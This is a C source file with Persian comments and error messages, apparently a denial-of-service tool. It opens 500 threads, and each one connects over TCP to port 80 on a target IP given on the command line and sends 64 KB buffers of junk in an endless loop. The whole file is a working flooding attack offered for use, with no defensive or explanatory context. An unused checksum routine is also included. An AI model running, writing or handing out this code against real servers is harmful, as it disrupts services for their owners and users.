#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <unistd.h>

#define BUFFER_SIZE 65535
#define THREAD_COUNT 500

// محاسبه Checksum
unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
    unsigned long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        sum += *(unsigned char *)ptr;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// ارسال بسته‌های حجیم
void *send_packets(void *arg) {
    char *target_ip = (char *)arg;
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock < 0) {
        perror("خطا در ایجاد سوکت");
        pthread_exit(NULL);
    }

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(80);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
        perror("اتصال به سرور ناموفق بود");
        close(sock);
        pthread_exit(NULL);
    }

    char buffer[BUFFER_SIZE];
    memset(buffer, 'A', BUFFER_SIZE);

    while (1) {
        if (send(sock, buffer, BUFFER_SIZE, 0) < 0) {
            perror("خطا در ارسال داده");
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("استفاده: %s <آدرس IP مقصد>\n", argv[0]);
        return 1;
    }

    pthread_t threads[THREAD_COUNT];

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, send_packets, argv[1]);
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
